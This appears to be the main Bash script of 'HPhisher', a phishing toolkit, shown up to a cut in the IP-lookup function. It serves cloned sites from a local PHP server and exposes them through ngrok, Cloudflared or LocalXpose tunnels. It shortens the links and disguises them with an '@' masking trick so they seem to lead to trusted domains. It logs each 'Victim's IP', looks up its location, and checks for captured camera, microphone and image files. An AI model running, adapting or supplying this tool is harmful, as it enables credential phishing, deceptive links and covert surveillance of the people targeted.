##COLOUR VARIABLES
#Text
RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
ORANGE="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
BLACK="$(printf '\033[30m')"
NC='\033[0m' #Reset colour
#Background
REDBG="$(printf '\033[41m')"
GREENBG="$(printf '\033[42m')"
ORANGEBG="$(printf '\033[43m')"
BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"
CYANBG="$(printf '\033[46m')"
WHITEBG="$(printf '\033[47m')"
BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" #Reset background

#Directories
pro_dir=$(pwd) #project directory
files_dir="${pro_dir}/files"
server_dir="${pro_dir}/.server" #server directory
sites_dir="${pro_dir}/.sites" #sites directory

#Time
date=$(date +%d-%m-%Y)
time=$(date +%H-%M-%S)
logs_dir=$(date +%d-%m-%Y-%H-%M-%S)
logs_full_dir="${files_dir}/${site_name}${logs_dir}"

#Normal Banner
banner(){
	echo " "
	echo -e "${GREEN} ███╗    ███╗${BLUE}██████╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██╔══██║ ${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
	echo -e "${GREEN} ███████████║${BLUE}██████╔╝██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██╔═══╝ ███████║██║███████╗███████║█████╗  ██████╔╝${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
	echo -e "${GREEN} ╚══╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
	echo -e "${CYAN}        ${NC} "
}
# Credits banner
cbanner(){
  echo " "
	echo -e "${GREEN} ███╗    ███╗${BLUE}██████╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██╔══██║ ${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
	echo -e "${GREEN} ███████████║${BLUE}██████╔╝██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██╔═══╝ ███████║██║███████╗███████║█████╗  ██████╔╝${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
	echo -e "${GREEN} ╚══╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
	echo -e "${CYAN}                                                  By - ${RED}Alygnt${NC}"
	echo -e "${CYAN}        ${NC} "
	echo -e "${RED}                           Version 1.0 ${NC}"
	echo -e "${CYAN}        ${NC} "
}
#Small Banner
sbanner(){
	echo " "
	echo -e "${GREEN} ▒█░░▒█${BLUE} ▒█▀▀█ ${NC}"
	echo -e "${GREEN} ▒█▒░▒█${BLUE} ▒█▄▄█ █░░█ ░▀░ █▀▀ █░░█ █▀▀ █▀▀█${NC}"
	echo -e "${GREEN} ▒█████${BLUE} ▒█░░░ █▀▀█ ▀█▀ ▀▀█ █▀▀█ █▀▀ █▄▄▀${NC}"
	echo -e "${GREEN} ▒█░░░█${BLUE} ▒█░░░ ▀░░▀ ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀ ▀░░▀${NC}"
	echo -e "${CYAN}        ${NC} "
}

## Directories
directories(){
if [[ ! -d ".server" ]]; then
        mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
        rm -rf ".server/www"
        mkdir -p ".server/www"
else
        mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
        rm -rf ".cld.log"
fi
if [[ ! -d "files" ]]; then
        mkdir -p "files"
fi
if [[ ! -d "files/audio" ]]; then
        mkdir -p "files/audio"
fi
if [[ ! -d "files/video" ]]; then
        mkdir -p "files/video"
fi
if [[ ! -d "files/image" ]]; then
        mkdir -p "files/image"
fi
if [[ ! -d ".sites" ]]; then
       "\n${GREEN}[${WHITE}#${GREEN}]${RED} Sites directory not found..."
	sleep 5
	"${GREEN}[${WHITE}#${GREEN}]${RED} Updating the tool..."
	check_net_update
fi
}

#Dependencies
dependencies() {
        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

        if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Packages already installed."
        else
                pkgs=(php curl wget unzip)
                for pkg in "${pkgs[@]}"; do
                        type -p "$pkg" &>/dev/null || {
                                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
                                if [[ `command -v pkg` ]]; then
                                        pkg install "$pkg" -y
                                elif [[ `command -v apt` ]]; then
                                        apt install "$pkg" -y
                                elif [[ `command -v apt-get` ]]; then
                                        apt-get install "$pkg" -y
                                elif [[ `command -v pacman` ]]; then
                                        sudo pacman -S "$pkg" --noconfirm
                                elif [[ `command -v dnf` ]]; then
                                        sudo dnf -y install "$pkg"
                                else
                                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
                                        { reset_color; exit 1; }
                                fi
                        }
                done
        fi

}

## Reset terminal colors
reset_color() {
        tput sgr0   # reset attributes
        tput op     # reset color
    return
}

## Exit message
msg_exit() {
        { clear; banner; echo; }
        echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
        { reset_color; exit 0; }
}

## Kill already running process
kill_pid() {
        if [[ `pidof php` ]]; then
                killall php > /dev/null 2>&1
        fi
        if [[ `pidof ngrok` ]]; then
                killall ngrok > /dev/null 2>&1
        fi
        if [[ `pidof cloudflared` ]]; then
                killall cloudflared > /dev/null 2>&1
        fi
}

#check whether execute permission is granted
xpermission(){
	if [[ -x "hphisher.sh" ]];then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
	else
	        chmod 777 hphisher.sh
	        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
	fi
}

#check for updates
check_update() {
	rm -rf version.txt
	rm -rf core/update/tmp/version.txt

	wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/HPhisher/main/core/update/version.txt > /dev/null 2>&1
	mv version.txt core/update/tmp

	current_ver=$( cat core/update/version.txt )
	lat_ver=$( cat core/update/tmp/version.txt )
	if [ $current_ver == $lat_ver ]; then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Your up to date!! ${NC} "
		{ sleep 3; clear; mainmenu; }
	else
		echo " "
		echo "${GREEN} Current version = ${YELLOW} $current_ver "
		echo "${GREEN} Latest version = ${YELLOW} $lat_ver "
		read -p "${GREEN}[${WHITE}#${GREEN}]${GREEN} Update found!! (Latest Version ${lat_ver} ) Do you want to update? (y/n) :"  ureply
		case $ureply in
			Y | y)
				update;;
			N | n)
				{ clear;  mainmenu; };;

		esac
	fi
}

update() {
	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} UPDATING ${NC}"
	mkdir $HOME/hphisher
	if [ -e .server/ngrok ]; then
		mv .server/ngrok $HOME/hphisher
	fi
	if [ -e .server/cloudflared ]; then
        	mv .server/cloudflared $HOME/hphisher
	fi

	cd ..
	rm -rf HPhisher
	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} REINSTALLING THE TOOL ${NC} "
	git clone https://github.com/Alygnt/HPhisher

	if [ -d HPhisher ]; then
		cd HPhisher
	        mv $HOME/hphisher/ngrok .server
	        mv $HOME/hphisher/cloudflared .server
	        rm -rf $HOME/hphisher
	        credits_banner
		echo " "
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} SUCCESSFULLY UPDATED!! ( Version: ${lat_ver} ) ${NC} "
	        sleep 0.3
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Now running the tool!! ${NC} "
	        sleep 2
	        bash hphisher.sh
		echo  " "
	else
		echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED} SORRY, ERROR OCCURED!! TRY REINSTALLING MANUALLY!! ${NC} "
	fi

}

## Install ngrok
check_ngrok(){
	if [ ! -e ".server/ngrok" ]; then
		echo " "
		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Ngrok Not installed do you want to install ngrok now? (Y/n) : ${BLUE}"
		case $REPLY in
		Y | y)
			install_ngrok
			ngrok_token_check;;

		N | n | *)
			tunnelmenu;;

		esac
	else
		ngrok_token_check
	fi
}
install_ngrok() {
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
		else
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
		fi
}
##Ngrok token auth
ngrok_token_check(){
        if [ -s "${HOME}/.ngrok2/ngrok.yml" ]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok Authtoken setup is already done."
		start_ngrok
        else
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${BLUE} Setting up authtoken"
                ngrok_token_setup
        fi
}
ngrok_token_setup(){
        if [[ -d "${HOME}/.ngrok2/" ]]; then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok2 directory exists!!"
        else
		mkdir $HOME/.ngrok2
		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Created Ngrok2 directory "
		echo " "
        fi

	rm -rf ${HOME}/.ngrok2/ngrok.yml
	read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter your authtoken :" ntoken
	echo "authtoken : ${ntoken}" >> ngrok.yml
	mv ngrok.yml ${HOME}/.ngrok2/
	./.server/ngrok config upgrade
	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Upgraded ngrok configurations"
	clear
	banner
	start_ngrok
}
ngrok_region() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter prefered region (Default=us) : "
	read -p "${GREEN}   (Example: us eu au ap sa jp in) : " ngrokregion
	case $ngrokregion in
	"us" | "US")
		ngrokregion="us";;
	"eu" | "EU")
		ngrokregion="eu";;
	"au" | "AU")
		ngrokregion="au";;
	"ap" | "AP")
		ngrokregion="ap";;
	"sa" | "SA")
		ngrokregion="sa";;
	"jp" | "JP")
		ngrokregion="jp";;
	"in" | "IN")
		ngrokregion="in";;
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Tryagain"
		sleep 5
		clear
		banner
		ngrok_region;;
	esac
}
## Start ngrok
start_ngrok() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
        { sleep 1; setup_site; }
	echo -e "\n"
	ngrokregion="us"
        read -p "${RED}[${WHITE}-${RED}]${GREEN} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${ORANGE} " reply
	case $reply in
	Y | y)
		ngrok_region;;
	N | n | *)
		echo " ";;
	esac
        echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
    else
        sleep 2 && ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
    fi
	sleep 15
	fetchlink_ngrok
	checklink
}
fetchlink_ngrok() {
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
        LINK="$ngrok_url"
}

## Install Cloudflared
check_cloudflared(){
	if [ ! -e ".server/cloudflared" ]; then
		echo " "
		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Cloudflared Not installed do you want to install Cloudflared now? (Y/n) : ${BLUE}"
		case $REPLY in
		Y | y)
			install_cloudflared
			start_cloudflared;;
		N | n | *)
			tunnelmenu;;
		esac
	else
                start_cloudflared
	fi
}
install_cloudflared() {
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
}
## Start Cloudflared
start_cloudflared() {
        rm .cld.log > /dev/null 2>&1 &
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
        { sleep 1; setup_site; }
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
                sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi
	sleep 15
	fetchlink_cloudflared
	checklink
}
fetchlink_cloudflared() {
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
        LINK="${cldflr_url}"
}

## Install LocalXpose
check_localxpose(){
	if [ ! -e ".server/loclx" ]; then
		echo " "
		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Localxpose Not installed do you want to install localxpose now? (Y/n) : ${BLUE}"
		case $REPLY in
		Y | y)
			install_localxpose
			token_localxpose
			start_loclx;;

		N | n | *)
			tunnelmenu;;

		esac
	else
		start_loclx
	fi
}
install_localxpose() {
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
}
token_localxpose() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Loclx Token :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnelmenu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}
## Start LocalXpose
start_loclx() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
	{ sleep 1; setup_site; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi
	sleep 15
	fetchlink_localxpose
	checklink
}
fetchlink_localxpose() {
	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
        LINK="${loclx_url}"
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Start localhost
start_localhost() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
        setup_site
        { sleep 1; clear; banner; }
        displaylocalhost
	capture_data_check
}

#Host and port setup
HOST='127.0.0.1'
cusport() {
	echo " "
	echo "${RED}[${WHITE}-${RED}]${GREEN}Your current port : ${BLUE}4444"
	read -p "${RED}[${WHITE}?${RED}]${GREEN}Do you want to setup Custom port (Y/n) : ${BLUE}"
	case $REPLY in
	Y | y)
		read -p "${RED}[${WHITE}?${RED}]${GREEN}Type your Custom port : ${BLUE}" cport
		PORT="${cport}";;

	N | n )
		PORT="4444";;
	*)
		PORT="4444";;
	esac
}

## Setup website and start php server
setup_site() {
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
        cp -rf .sites/"$site_name"/"$site_template"/* .server/www
	if [ -e ".sites/ip.php" ]; then
		cp .sites/ip.php .sites/"$website"/* .server/www
	else
		wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/HPhisher/main/.sites/ip.php
		mv ip.php .sites
		cp .sites/ip.php .sites/"$website"/* .server/www
	fi
	if [ -e ".sites/index.php" ]; then
		cp .sites/index.php .sites/"$website"/* .server/www
	else
		wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/HPhisher/main/.sites/index.php
		mv index.php .sites
		cp .sites/index.php .sites/"$website"/* .server/www
	fi
	cusport
        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
        cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

#Check whether link was generated properly
checklink() {
	if [ -z "$LINK" ]; then
		clear
		banner
		echo " "
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error in generating the link"
		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting localhost. You might need to start tunneler manually"
		sleep 5
		start_localhost
	else
		cusurl
	fi
}

## URL MASKING
cusurl(){
	clear
	banner
	echo " "
	echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Do You want to Customize the uRL BeLow?"
	echo " "
	read -p "${RED}[${WHITE}-${RED}]${ORANGE} $LINK (Y/n) : ${ORANGE}" CUS_URI
	case $CUS_URI in
                Y | y)
			check_netstats
			if [ $netstats=="Online" ]; then
				shorten_keystocks
			else
				{ clear; sbanner; }
				echo "${RED}Your offline, Cannot shorten link. Proceeding without shortening link"
				sleep 5
				displaylink
				capture_data_check
			fi;;
                N | n )
			displaylink
			capture_data_check;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Try again!!!\a\a"
	                { clear; banner; cusurl; }
                esac
}
shorten_keystocks(){
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN}Enter Your Custom uRL (eg:https://google.com | www.google.com) : " CUS_URL
	checkurl ${CUS_URL}
	echo " "
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks #KEY_STOCKS
	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
		shorten
	else
		echo -ne "\n\a\a${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid Input : ${Keystks}"
		{ sleep 1.5; clear; banner; cusurl; }
	fi
}
checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
	if [[ ! "${1//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
		if [[  "${1::3}" != 'www' ]]; then
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid URL | USE www/http or https insted of : ${CUS_URL}"
			{ sleep 1.5; clear; banner; cusurl; }
		fi
	fi
}
check_site() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
shorten() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} SHORTENING URL : ${YELLOW} ${LINK}"
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Shortening maytake some time (approx 30 seconds)"
	isgd="https://is.gd/create.php?format=simple&url="
	shortcode="https://api.shrtco.de/v2/shorten?url="
	tinyurl="https://tinyurl.com/api-create.php?url="
	if [[ $(check_site $isgd) == 2* ]]; then
		shorten_isgd $isgd "$LINK"
	else
		final_isgd_url="${ORANGE} Couldn't shorten this link here"
                masked_isgd_url="${ORANGE} Couldn't mask this link here"
	fi
	if [[ $(check_site $shortcode) == 2* ]]; then
		shorten_shortcode $shortcode "$LINK"
	else
		final_shortcode_url1="${ORANGE} Couldn't shorten this link here"
                masked_shortcode_url1="${ORANGE} Couldn't mask this link here"
		final_shortcode_url2="${ORANGE} Couldn't shorten this link here"
                masked_shortcode_url2="${ORANGE} Couldn't mask this link here"
		final_shortcode_url3="${ORANGE} Couldn't shorten this link here"
                masked_shortcode_url3="${ORANGE} Couldn't mask this link here"
	fi
	if [[ $(check_site $tinyurl) == 2* ]]; then
		shorten_tinyurl $tinyurl "$LINK"
	else
		final_tinyurl_url="${ORANGE} Couldn't shorten this link here"
                masked_tinyurl_url="${ORANGE} Couldn't mask this link here"
	fi
	displayshortlink
}
shorten_isgd() {
	link_isgd=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	processed_isgd_url=${link_isgd#http*//}
	final_isgd_url="https://$processed_isgd_url"
	masked_isgd_url="${CUS_URL}-${Keystks}@$processed_isgd_url"
}
shorten_shortcode() {
	link_shortcode=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	processed_shortcode_url1=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	final_shortcode_url1="https://$processed_shortcode_url1"
	masked_shortcode_url1="${CUS_URL}-${Keystks}@$processed_shortcode_url1"
	processed_shortcode_url2=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	final_shortcode_url2="https://$processed_shortcode_url2"
	masked_shortcode_url2="${CUS_URL}-${Keystks}@$processed_shortcode_url2"
	processed_shortcode_url3=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link3":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	final_shortcode_url3="https://$processed_shortcode_url3"
	masked_shortcode_url3="${CUS_URL}-${Keystks}@$processed_shortcode_url3"
}
shorten_tinyurl() {
	link_tinyurl=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	if [ $link_tinyurl=="" ]; then
		processed_tinyurl_url="${ORANGE} Couldn't shorten this link here"
		final_tinyurl_url="${ORANGE} Couldn't shorten this link here"
		masked_tinyurl_url="${ORANGE} Couldn't mask this link here"
	else
		processed_tinyurl_url=${link_tinyurl#http*//}
		final_tinyurl_url="https://$processed_tinyurl_url"
		masked_tinyurl_url="${CUS_URL}-${Keystks}@$processed_tinyurl_url"
	fi
}

## Display link
displaylocalhost(){
	clear
	sbanner
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} LOCALHOST URL : ${GREEN}http://${HOST}:${PORT}"
}
displaylink(){
	displaylocalhost
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} ORIGINAL URL  : ${GREEN}${LINK}"
}
displayshortlink() {
	displaylink
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 1 : ${GREEN}${final_isgd_url}"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  1 : ${GREEN}${masked_isgd_url}"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 2 : ${GREEN}${final_shortcode_url1}"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  2 : ${GREEN}${masked_shortcode_url1}"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 3 : ${GREEN}${final_shortcode_url2}"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  3 : ${GREEN}${masked_shortcode_url2}"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 4 : ${GREEN}${final_shortcode_url3}"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  4 : ${GREEN}${masked_shortcode_url3}"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 5 : ${GREEN}${final_tinyurl_url}"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  5 : ${GREEN}${masked_tinyurl_url}"
	echo -e "\n${RED}[${WHITE}#${RED}]${BLUE}If above link is empty just ignore it, Use the generated link"
	capture_data_check
}

#Capture data check
capture_data_check(){
	if [ -f .server/www/AUDIO ];then
                capture_data_audio
        elif [ -f .server/www/IMAGE ];then
                capture_data_image
        elif [ -f .server/www/VIDEO ];then
                capture_data_video
	elif [ -f .server/www/VIDAUD ];then
               capture_data_video_audio
	else
	    	echo " Error Occured!!"
        fi
}

## Get IP address
capture_ip() {
        IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
        IFS=$'\n'
        echo -e "\n${RED} Victim's IP : ${RED}$IP"
	echo -e " "
	if [ reply_tunnel=1 ]; then
		echo -ne "${RED} IP details cannot be captured in localhost server"
		echo " "
		rm -rf .server/www/ip.txt
	elif [ reply_tunnel=01 ]; then
		echo -ne "${RED} IP details cannot be captured in localhost server"
		echo " "
		rm -rf .server/www/ip.txt
	else
		ip_details
		save_ip
	fi
}
save_ip() {
	if [ -d ${files_dir}/${site_name}/${logs_dir} ]; then
		cat .server/www/ip.txt >> ${logs_full_dir}/ip.txt
		rm -rf .server/www/ip.txt
	else
		mkdir ${logs_dir}
		mv ${logs_dir} ${files_dir}/${site_name}/
		mv .server/www/ip.txt ${logs_full_dir}
	fi
	echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} ${logs_full_dir}"
}
ip_details() {
	echo " " 
	echo "${RED}[${WHITE}-${RED}]${GREEN} Trying to capture details of IP : ${BLUE}${IP} "
##	curl -s -L "http://ipwhois.app/json/$IP" -o rawtrack.txt
	wget --no-check-certificate "http://ipwhois.app/json/${IP}" -O rawtrack.txt > /dev/null 2>&1
	sleep 2
	grep -o '"[^"]*"\s*:\s*[^,]*' rawtrack.txt > track.txt
	iptt=$(sed -n 's/"ip"://p' track.txt)
	if [[ $iptt != "" ]]; then
		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
	fi
	ipstats=$(sed -n 's/"success"://p' track.txt)
	if [[ $ipsuccess != "" ]]; then
                echo -e  "\n${GREEN} IP details capturing: ${NC} $iptt"
        fi
	iptype=$(sed -n 's/"type"://p' track.txt)
	if [[ $iptype != "" ]]; then
